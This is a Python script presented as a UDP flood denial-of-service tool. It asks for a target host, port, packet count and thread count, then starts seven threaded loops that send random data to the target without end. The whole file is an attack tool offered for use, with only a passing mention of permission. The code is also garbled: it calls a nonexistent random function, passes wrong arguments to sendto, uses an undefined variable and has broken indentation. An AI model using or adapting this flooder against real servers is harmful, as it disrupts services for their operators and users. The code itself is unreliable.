"""
UDP Flooder.
This is a 'Dos' attack program to attack servers, you set the IP always that you have permission to do it.
and the port and the amount of seconds and it will start flooding to that server.
Created by Jecoster -> https://github.com/Jecoster/Python-UDP-Flood
Usage : ./flood_udp
Press enter to continue and introduce the data.
"""
import signal
import time
import socket
import random
import threading
import sys
import os
from os import system, name
import datetime

print("\033[1;34;40m \n")
os.system("figlet DDOS ATTACK -f slant")
print("\033[1;33;40m If you have any issue post a thread on https://github.com/Jecoster/Python-UDP-Flood/issues\n")

print("\033[1;32;40m ==> Developer Jecoster <==  \n")
test = input()
if test == "n":
	exit(0)
name = int(input("\033[1;33;40m [K] Masukan Nama Kamu:"))
ip = str(input("\033[1;33;40m [K] Enter Attack Host:"))
port = int(input("\033[1;33;40m [K] Enter Attack Port:"))
choice = str(input("\033[1;32;40 [K] Enter Methods UDP Attack(Attack/n):"))
times = int(input("\033[1;33;40m [K] Enter Attack Packets Connection:"))
threads = int(input("\033[1;33;40 [K] Enter Attack Threads Commection:"))
os.system("clear")

time.sleep(5)
print(" [ =                        ] 0%")
time.sleep(5)
print(" [ =======             ] 25%")
time.sleep(5)
print(" [ =========            ] 50%")
time.sleep(5)
print(" [ ============         ] 75%")
time.sleep(5)
print(" [ ===============     ] 100%")
os.system("clear")

def Attack():
	bytes = random._radint(21372,37682)
	data = random._urandom(20000)
	M = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if udp else socket.SOCK_STREAM) #UDP = SOCK_DGRAM
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(bytes,data,addr)
			print(M +"Sent Attack Packet To Target")
		except:
			s.close()
			print(" [K] Sent Attack Packet To Target")

def Attack2():
	bytes = random._radint(21372,37682)
	data = random._urandom(696969)
	M = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if udp else socket.SOCK_STREAM) #UDP = SOCK_DGRAM
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(bytes,data,addr)
			print(M +"Sent Attack Packet To Target")
		except:
			s.close()
			print(" [K] Sent Attack Packet To Target")

def Attack3():
	bytes = random._radint(37682,4096)
	data = random._urandom(200000)
	M = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if udp else socket.SOCK_STREAM) #UDP = SOCK_DGRAM
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(bytes,data,addr)
			print(M +"Sent Attack Packet To Target")
		except:
			s.close()
			print(" [K] Sent Attack Packet To Target")

def Attack4():
	bytes = random._radint(20000,2000)
	data = random._urandom(696969)
	M = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if udp else socket.SOCK_STREAM) #UDP = SOCK_DGRAM
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(bytes,data,addr)
			print(M +"Sent Attack Packet To Target")
		except:
			s.close()
			print(" [K] Sent Attack Packet To Target")

def Attack5():
	bytes = random._radint(16, 65534)
	data = random._urandom(577)
	M = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if udp else socket.SOCK_STREAM) #UDP = SOCK_DGRAM
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(bytes,data,addr)
			print(M +"Sent Attack Packet To Target")
		except:
			s.close()
			print(" [K] Sent Attack Packet To Target")

def Attack6():
	bytes = random._radint(400, 12345)
	data = random._urandom(8095)
	M = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if udp else socket.SOCK_STREAM) #UDP = SOCK_DGRAM
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(bytes,data,addr)
			print(M +"Sent Attack Packet To Target")
		except:
			s.close()
			print(" [K] Sent Attack Packet To Target")
			
def Attack7():
	bytes = random._radint(65534, 577)
	data = random._urandom(577)
	M = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if udp else socket.SOCK_STREAM) #UDP = SOCK_DGRAM
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(bytes,data,addr)
			print(M +"Sent Attack Packet To Target")
		except:
			s.close()
			print(" [K] Sent Attack Packet To Target")
			
for y in range(threads):
	if choice == 'Attack':
		th = threading.Thread(target = Attack)
			th.start()
			th = threading.Thread(target = Attack2)
			th.start()
			th = threading.Thread(target = Attack3)
			th.start()
			th = threading.Thread(target = Attack4)
			th.start()
			th = threading.Thread(target = Attack5)
			th.start()
			th = threading.Thread(target = Attack6)
			th.start()
			th = threading.Thread(target = Attack7)
			th.start()

def new():
	for y in range(threads):
		if choice == 'Attack':
			th = threading.Thread(target = Attack)
			th.start()
			th = threading.Thread(target = Attack2)
			th.start()
			th = threading.Thread(target = Attack3)
			th.start()
			th = threading.Thread(target = Attack4)
			th.start()
			th = threading.Thread(target = Attack5)
			th.start()
			th = threading.Thread(target = Attack6)
			th.start()
			th = threading.Thread(target = Attack7)
			th.start()
			
def whereuwere():
    print("Aww man, I'm so sorry, but I can't remember if u were in TCP or UDP")
    print("Put 1 for UDP and 2 for TCP")
    whereman = str(input(" 1 or 2 >:("))
    if whereman == '1':
        Attack()
        Attack2()
        Attack3()
        Attack4()
        Attack5()
        Attack6()
        Attack7()

def clear():
    if name == 'nt':
        _ = system('cls')
    else:
        _ = system('clear')

def byebye():
	clear()
	os.system("figlet Youre Leaving Sir -f slant")
	sys.exit(130)

def exit_gracefully(signum, frame):
    # restore the original signal handler
    signal.signal(signal.SIGINT, original_sigint)

    try:
        exitc = str(input(" You wanna exit bby <3 ?:"))
        if exitc == 'y':

            byebye()

    except KeyboardInterrupt:
        print("Ok ok")
        byebye()

    # restore the gracefully exit handler
    signal.signal(signal.SIGINT, exit_gracefully)

if __name__ == '__main__':
    # store SIGINT handler
    original_sigint = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, exit_gracefully)
